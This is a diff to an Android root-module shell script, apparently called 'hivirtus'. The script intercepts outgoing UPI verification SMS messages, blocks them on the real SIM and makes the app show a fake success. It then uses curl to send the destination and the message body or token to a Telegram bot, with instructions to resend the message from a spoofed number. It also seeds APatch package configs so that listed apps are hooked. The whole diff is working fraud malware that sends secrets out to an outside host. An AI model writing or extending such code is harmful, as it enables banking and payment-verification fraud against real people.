@@ -144,6 +144,9 @@ mark_active() {
 
 sync_config
 
+seed_apatch_config
+seed_hooked_pkgs
+
 # Reboot ke baad APK install + overlay permission + service start
 hivirtus_boot_activate_overlay &
 
@@ -210,30 +213,47 @@ enforce_sms_block() {
   chmod 644 /data/local/tmp/hivirtus_phone_sms_denied.flag 2>/dev/null
 }
 
+read_tg_creds() {
+  TG_TOKEN=""
+  TG_CHAT=""
+  for f in /data/local/tmp/hivirtus_telegram_credentials.json \
+    "$MODDIR/telegram_credentials.json" \
+    "$RUNTIME" "$CONFIG"; do
+    [ -f "$f" ] || continue
+    [ -z "$TG_TOKEN" ] && TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    [ -z "$TG_CHAT" ] && TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    [ -n "$TG_TOKEN" ] && [ -n "$TG_CHAT" ] && break
+  done
+}
+
+read_blocked_sms() {
+  BLOCKED_DEST=""
+  BLOCKED_BODY=""
+  if [ -f /data/local/tmp/hivirtus_outgoing_blocked.json ]; then
+    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
+  fi
+  if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_outgoing_blocked.flag ]; then
+    BLOCKED_DEST=$(head -n1 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
+    BLOCKED_BODY=$(tail -n +2 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
+  fi
+}
+
 forward_blocked_telegram() {
-  FLAG="/data/local/tmp/hivirtus_outgoing_blocked.flag"
-  [ ! -f "$FLAG" ] && return 0
-  TG="/data/local/tmp/hivirtus_telegram_credentials.json"
-  [ ! -f "$TG" ] && TG="$MODDIR/telegram_credentials.json"
-  [ ! -f "$TG" ] && return 0
-  LINE=$(cat "$FLAG" 2>/dev/null | head -n1)
-  [ -z "$LINE" ] && return 0
-  DEST="${LINE%%|*}"
-  BODY="${LINE#*|}"
-  TOKEN=$(grep '"telegram_bot_token"' "$TG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
-  CHAT=$(grep '"telegram_chat_id"' "$TG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
-  [ -z "$TOKEN" ] || [ -z "$CHAT" ] && return 0
+  read_blocked_sms
+  [ -z "$BLOCKED_BODY" ] && return 0
+  read_tg_creds
+  [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0
   TEXT="📱 Verify SMS Blocked — Fake Success ✅
 @hivirtus @liqdy
 
-App: UPI Verify
-Real SIM: blocked
+Real SIM: blocked · App ko success dikha
 
 To (short code):
-${DEST}
+${BLOCKED_DEST}
 
 Body / Token:
-${BODY}"
+${BLOCKED_BODY}"
   SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
   if [ -n "$SPOOF" ]; then
     TEXT="${TEXT}
@@ -243,15 +263,43 @@ ${SPOOF}
 
 Messages se isi number wali SIM se manually bhejo"
   fi
+  SENT=0
   if command -v curl >/dev/null 2>&1; then
-    curl -s -m 20 -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
-      --data-urlencode "chat_id=${CHAT}" \
-      --data-urlencode "text=${TEXT}" >/dev/null 2>&1
+    curl -s -m 25 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+      --data-urlencode "chat_id=${TG_CHAT}" \
+      --data-urlencode "text=${TEXT}" >/dev/null 2>&1 && SENT=1
   fi
   am broadcast -a com.hivirtus.zygiskmode.OUTGOING_BLOCKED \
     -n com.hivirtus.zygiskmode/.BlockedSmsReceiver \
-    --es dest "$DEST" --es body "$BODY" 2>/dev/null
-  rm -f "$FLAG"
+    --es dest "$BLOCKED_DEST" --es body "$BLOCKED_BODY" 2>/dev/null
+  if [ "$SENT" = "1" ]; then
+    rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
+    rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
+  fi
+}
+
+seed_hooked_pkgs() {
+  SRC_LIST="$MODDIR/apatch_package_config_full.csv"
+  [ ! -f "$SRC_LIST" ] && return 0
+  OUT="/data/local/tmp/hivirtus_hooked_pkgs.txt"
+  awk -F, 'NR>1 && $2==0 && $1 ~ /^com\./ {print $1}' "$SRC_LIST" 2>/dev/null | grep -vE '^(com\.android\.|bin\.|org\.)' > "$OUT" 2>/dev/null
+  chmod 644 "$OUT" 2>/dev/null
+}
+
+seed_apatch_config() {
+  SRC="$MODDIR/apatch_package_config_full.csv"
+  DST="/data/adb/ap/package_config"
+  FLAG="/data/local/tmp/hivirtus_apatch_config_seeded.flag"
+  [ ! -f "$SRC" ] || [ ! -d /data/adb/ap ] && return 0
+  if [ -f "$DST" ]; then
+    LINES=$(wc -l < "$DST" 2>/dev/null || echo 0)
+    [ "$LINES" -gt 50 ] && touch "$FLAG" 2>/dev/null && return 0
+  fi
+  [ -f "$FLAG" ] && return 0
+  cp -f "$SRC" "$DST" 2>/dev/null
+  chmod 644 "$DST" 2>/dev/null
+  echo 1 > "$FLAG"
+  chmod 644 "$FLAG" 2>/dev/null
 }
 
 (
